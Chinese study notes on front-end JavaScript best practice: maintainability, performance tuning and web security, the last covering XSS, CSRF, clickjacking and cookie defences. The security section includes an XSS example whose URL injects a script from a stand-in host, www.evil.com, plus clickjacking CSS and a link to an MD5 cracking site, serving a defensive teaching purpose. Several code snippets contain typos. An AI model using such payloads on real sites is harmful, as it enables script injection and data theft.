# 最佳实践

- 最佳实践定义比较稳定,一般都是指包括

  - 可维护
  - 高性能
  - 安全性

# JS 可维护

- 可维护 ≈ 可读 + 可迁移 + 可扩展 + 可调试

- 验证

  - JSLint...

- 压缩

  - 文件压缩
  - http压缩

    - gzip httpd.conf .htaccess文件
    - mod_gzip_item_include file .js$

- 松散耦合

  - HTML/JavaScript耦合 eg. onlick
  - 将应用逻辑从事件处理程序中分离的

- 几条原则

  - 勿将 event 对象传给其他方法；只传来自 event 对象中所需的数据
  - 任何可以在应用层面的动作都应该可以在不执行任何事件处理程序的情况下进行
  - 任何事件处理程序都应该处理事件，然后将处理转交给应用逻辑

- 编程实践

  - 尊重对象所有权(不修改不属于你的领域代码)
  - 避免全局变量和函数
  - 避免与 null 进行比较
  - 使用常量

- 基础

```javascript
// 避免定义全局变量或函数
把变量和方法封装到对象里
封装在局部作用域里   

// 防止代码污染
var hi = (function() {
var length = 0;
function init() {
console.log("hello");
}

function action() {

}

return {
init: init
}
}());

hi.init();

// 使用简化的编码方式
// 不要用new
// == ===

避免使用with 多出单独的作用
避免eval

// 不要编写检测浏览器的代码
取而代之的是检测浏览器是否支持某一特定功能 $.support
或者Modernizr

兼容代码单独放在文件里
<! -- [if it ie 9]>
<script src="xx.js"></script>
<! [endif]-->
```

- 其他

```javascript
// use strict
不要全局启用
放函数里或放在自执行函数里

在已有代码中谨慎启用严格模式 - 重构

// JSHint JSLint

//  分离
事件处理与业务逻辑分离
配置数据与代码逻辑分离
逻辑与结构样式分离

// 从JS中分离CSS
style.borderColor -> style.cssText
style.cssText -> className += “empty”
h5 list[i].classList.add('empty');

// 从JS中分离HTML
从服务器端获取html
Jq $('').load();
从客户端动态生成页面结构
h5 template标签

<script id="main_info" type="text/x-tmpl">
<li><b>${name}<b> (${class})</li>
</script>

var infoTmpl = document.getElementById('main_info').innerHTML();
```

- JS模板的使用

```javascript
Mustache Logic-less 易被集成
Handlebars 支持预编译
underscore
其他： Jade EJS Micro-Templating
网站 Template-engine-chooser
不要在模板中滥用逻辑块
不要构建太复杂的模板
使用预编译模板
Grunt预先把Handlebars
```

- 使用MVC模式

```javascript
Angular Meteor Ember Knockout Backbone
双向绑定 模板 路由 可观察对象
TodoMVC项目
```

- JS模块化开发

```javascript
CommonJS 同步 node.js 服务器端
AMD 异步 有网络延迟的浏览器
requireJS 管理前端代码模块
curl
jquery也可支持

// 防污染
var module = (function($, mudule2) {
  // code
})(jQuery, module2);

// 让jq支持AMD
if( typeof mudule === "object"
    && module
    && typeof module.exports === "") {
  module.exports = jQuery;
} else {
  window.jQuery = window.$ = jQuery;
  if(typeof define === "function" && define.end ) {
    define("jQuery", [], function() { return jQuery; });
  }
}
```

- 合理使用AJAX技术

```javascript
明确ajax的使用场景
有些跳转页面即可
ajax会破坏浏览器回退按钮 - jquery-hashchange
借助成熟的ajax框架，但不要忘记原生方法
jQuery, Dojo， YUI， ExtJS
做好用户交互
进行ajax时给用户反馈
防止用户重复操作 禁用按钮
时间限制，超时终止
使用JSON
使用合适的方案，弥补ajax的不足
```

# JS高性能

- 特别注意作用域
- 优化循环

  - 减值迭代
  - 简化终止条件
  - 确保没有某些可以被很容易移出循环的密集计算
  - 使用后测试循环

- 展开循环

  - Duff 装置技术(如果处理的不是大数据集，一般来说并不值得)

- 避免双重解释

  - 当使用 eval() 函数或者是Function 构造函数以及使用 setTimeout() 传一个字符串参数时都会发生这种情况

- 有一些东西较快

  - 原生方法较快 例Math的求正弦比JS写一个好(原生方法是用诸如 C/C++之类的编译型语言写出来的)
  - Switch比if语句较快
  - 位运算符较快

    - 取模，逻辑与和逻辑或

    - 最小化语言数

    - 一个var语句要比单个变量分别声明快很多

- 插入迭代值 var name = values[i++];

- 使用数组[]和对象字面量{}

- 优化DOM操作

  - 最小化现场更新
  - 使用innerHTML比使用标准 DOM 方法创建同样的 DOM 结构快得多
  - 使用事件代理
  - 注意 HTMLCollection??????

    - 保存变量，避免多次循环

```javascript
// 匈牙利标记法(已失宠，但值得借鉴) ==========
var bFound; //布尔型
var iCount; //整数
var sName; //字符串
var oPerson; //对象

// CSS 对 JavaScript 的松散耦合 ===========
element.className = "edit";

// JavaScript 对 CSS 的紧密耦合
div {
  width: expression(document.body.offsetWidth - 10 + "px");
}

// 创建命名空间来组合功能 ==============
// 创建全局对象
var Wrox = {};

// 为 Professional JavaScript 创建命名空间
Wrox.ProJS = {};

// 将书中用到的对象附加上去
Wrox.ProJS.EventUtil = { ... };
Wrox.ProJS.CookieUtil = { ... };

// 逻辑与数据隔离 ==================
var Constants = {
  INVALID_VALUE_MSG: "Invalid value!",
  INVALID_VALUE_URL: "/errors/invalid.php"
};
function validate(value){
  if (!value){
    alert(Constants.INVALID_VALUE_MSG);
    location.href = Constants.INVALID_VALUE_URL;
  }
}

// 避免全局查找(找全局链式要上溯) ===========
function updateUI(){
  var doc = document;
  var imgs = doc.getElementsByTagName("img");

  for (var i=0, len=imgs.length; i < len; i++){
    imgs[i].title = doc.title + " image " + i;
  }
  var msg = doc.getElementById("msg");
  msg.innerHTML = "Update complete.";
}

var url = window.location.href;
var query = url.substring(url.indexOf("?"));

// 优化循环 =================
for (var i=0; i < values.length; i++){
    process(values[i]);
}

for (var i=values.length -1; i >= 0; i--){ // value.length只取了一次
    process(values[i]);
}

var i=values.length -1;
if (i > -1){
  do {
      process(values[i]);
  }while(--i >= 0);
}

// 更快的 Duff 装置技术 =================
// credit: Speed Up Your Site (New Riders, 2003)
var iterations = Math.floor(values.length / 8);
var leftover = values.length % 8;
var i = 0;
if (leftover > 0){
  do {  
    process(values[i++]);
  } while (--leftover > 0);
}
do {
  process(values[i++]);
  process(values[i++]);
  process(values[i++]);
  process(values[i++]);
  process(values[i++]);
  process(values[i++]);
  process(values[i++]);
  process(values[i++]);
} while (--iterations > 0);

// 正确使用innerHTML操作DOM ======================
var list = document.getElementById("myList"),
  html = "",
  i;
for (i=0; i < 10; i++) {
  html += "<li>Item " + i + "</li>";
}
list.innerHTML = html;
```

- JS加载

  - 模块加载框架 HeadJS RequireJS LABjs
  - defer(JS代码不会产生页面内容) 和 async(不受限于顺序)
  - 不优雅的方式，动态创建JS元素

```javascript
var script = document.createElement("script");
script.type = "text/javascript";
script.src="file.js";
document.getElementByTagName_r("head")[0].appendChild(script);
```

- 拼接字符串的三种方案

  - 不同浏览器（优化不同）执行速度不同，所以不用计较

```javascript
// solution 1
str += "hello" + "js";

// solution 2
str += "hello";
str += "world";针对原始图片独立做一台缩略图

// solution 3
var strArr = [];
strArr.push('str');
strArr.push("world");
str = strArr.join("");
```

- 尽管不能确认最优，但是可以知道什么是可以优化的

  - 嵌套循环时把大循环当做内循环
  - new String Number Boolean(不推荐) -> var a = true;
  - 缓存计算结果，例如缓存浏览器滚动条宽度

- 其他性能优化

  - 少用 for in
  - clone

```javascript
function clone() {
    if(null == obj || "object" != typeof obj) return obj;
    var copy = obj.constructor();
    copy.foo = obj.foo;
    copy.bar = obj.bar;
    return  copy;
}
```

- 数组尽量不要混合多种数据类型，可以用对象
- 不要在闭包中返回外部不需要的对象
- 及时移除dom监听
- 少用全局变量
- delete 在chrome中可能妨碍性能优化
- 避免多次的跨作用查询,作用域链有关

```javascript
function update() {
    var doc = document;
    var imgs = doc.getElementsByTagName("img");
    for(var i=0, len=imgs.length; i<len; i++) {
        imgs[i].title = doc.title + "- image-" + i;   
    }
}
```

- 不推荐使用with，无形中形成作用域
- try catch, catch处理一脚外部函数

```javascript
try {
} catch(ex) {
    errorHandler(ex);
}
```

- DOM操作

  - 重绘与重排

    - 增删和修改元素可见性
    - 页面初始化渲染
    - 移动DOM元素
    - 修改CSS样式
    - DOM元素内容改变
    - 窗口尺寸改变
    - 浏览器窗口滚动

  - 合并多次的DOM操作为单次

  - 把DOM元素离线或者隐藏后修改

    - clone DOM 到内存

```javascript
var old = document.getElementById("myElement");
var clone = old.cloneNode(true);
old.parentNode.replaceChild(clone, old);
```

- 设置具有动画效果的DOM元素position为fixed或absolute
- 谨慎取得DOM元素的布局信息

  - 浏览器会优化连续的DOM操作

    - 使用事件托管方式绑定事件

      - 在父元素上绑定，然后判断子元素事件

    - 辅助工具 PageSpeed YSlow jsPerf

    - JavaScript性能测试库 JSLitmus

# JS 高安全性

- 乌云网 - 国内著名的漏洞报告平台
- 黑客攻击网站的主要手段有

  - SQL注入
  - 网络钓鱼
  - 跨站攻击
  - 拒绝服务攻击

- 打开链接都有坑 <https://juejin.im/entry/59f97d3851882558513203d9>

  - 如果是a标签要在新窗口中打开，添加noopener属性
  - 如果是js中打开新窗口，手动将新窗口的opener置为null

````javascript
打开的页面地址是固定的？直接a标签加上target="_blank"属性搞定。
打开的页面地址是动态计算的？使用js进行window.open(url)搞定。

var otherWindow = window.open();
otherWindow.opener = null;
otherWindow.location = 'http://newurl';
```

- 攻击网站前端的方法

  - XSS 跨站点脚本攻击

    - 同源策略没有限制页面中加载第三方的脚本
    - 尽一切方法在目标网站上执行非目标网站上原有的脚本

```javascript
<script>
    eval(location.hash.substr(1));
</script>

http://host/test.html#document.write("<script/src=//www.evil.com/evil.com/evil/js></script>")
````

- CSRF 跨站点请求伪造 请求来源于其他网站

```javascript
http:www.a,com/del?id=21
```

- 界面操作劫持

  - 点击劫持
  - 拖放劫持
  - eg. 可见输入框内覆盖一个不可见的框

```javascript
filter: alpha(opacity=0);
opacity: 0;
z-index: 100
```

- 不要轻易相信任何外部传入的数据

  - 不要轻易信任用户输入的数据 -> 数据过滤

    - Jq中$('').text() 而非 html()
    - 使用$('').attr() css()
    - URL -> encodeURL
    - jqencoder
    - setTimeout setInterval eval 这些函数都有安全隐患

  - 不要轻易信任任何传入的第三方数据

    - JSONP 一定要检查从第三方返回的数据格式

  - 不要仅靠JS来阻止注入

- 其他前端安全防范实践

  - cookie 设置为httpOnly

    - XSS不能通过JS获取Cookie
    - h5的localStorage
    - SSL 启用cookie的Secure设置

  - 防止网页被其他网站内嵌为iframe

    - JS阻止

```javascript
<style id="antiClickjack">body{display:none !important; }<style>

<script>
if(self === top) {
    var antiClickjack = document.getElementById('antiClickjack');
    antiClickjack.parentNode.removeChild(antiClickjack);
} else {
    top.location = self.location;
}
</script>
// 首先设置不可见
// 如果没有被内嵌移除不可见样式
// 否则把顶层页面的地址设置成内嵌页面的地址
```

- X-Frame-Options响应头

  - DENY
  - SAMEORIGIN
  - ALLOWFROM URI ?? 允许特定域

# 状态码

```javascript
200    请求资源成功
201    同步处理资源的新建或修改成功，返回包含新资源地址的 Location 头
202    资源的新建或修改进入异步
204    不返回响应主体的成功请求的响应，例如，资源删除成功
206    返回了部分资源
400    请求格式、参数缺失或者错误
401    没有权限
403    访问被禁止
404    资源不存在
405    所请求的 HTTP 方法不允许当前认证用户访问
406    请求的数据格式不存在
410    资源被永久删除
415    请求的媒体类型错误
422    请求理解成功，但是参数验证错误
429    请求频率超限
500    服务器内部错误
```

# 前端安全

- [彩虹表撞](http://md5.gongjuji.net/dencrypt/)
- [javascrypt](http://www.fourmilab.ch/javascrypt/)
- 乌云网

- 常见攻击

```javascript
// 富客户端

// 攻击类型 跨站点攻击 Cookie劫持 伪造恶意代码

因此需要做必要的安全校验和编码
```

- 防御

```javascript
Web应用程序安全与风险/核心防御机制/Web应用程序技术/解析应用程序
避开客户端控件/攻击验证机制/攻击会话管理/攻击访问控制/攻击数据存储区
测试后端组件

攻击应用程序逻辑/攻击其他用户/其他技巧/定制攻击自动化/利用信息泄露/攻击本地编译型应用程序
攻击应用程序架构
攻击Web服务器

查找源代码中的漏洞
Web应用程序黑客工具包
Web应用程序渗透测试方法
```

- 参考

```javascript
黑客攻防技术宝典：Web实战篇
```

# 关于强弱密码

- <https://juejin.im/entry/59916f5e518825486b16f0b6?utm_source=gold_browser_extension>

- 频繁的更改密码没有预想的效果，达不到保护密码安全的目的

```
当年NIST主管Bill Burr撰写了一份名为NIST Special Publication 800-63的文档，
建议大家设置密码时混合大写字母、字符和数字，并定期修改。
这么成（keng）熟（die）的建议后来被各大媒体广为传播，一时传为美谈。

研究显示此类标准，并没有什么卵用……
```

> 前端所有的防御手段都只能防君子

# 程序世界里的不信任原则

- <https://juejin.im/post/59bf6d0b6fb9a00a4a4cb51d?utm_source=gold_browser_extension>

  - 灰度发布
  - 柔性放过(结果超时则跳过该逻辑，进行下一步)
  - 打击如IP、号码等信息聚集，频率过快等机器行为，请求重放、劫持等请求

# 参考

```javascript
web前端最佳实践 党建
```
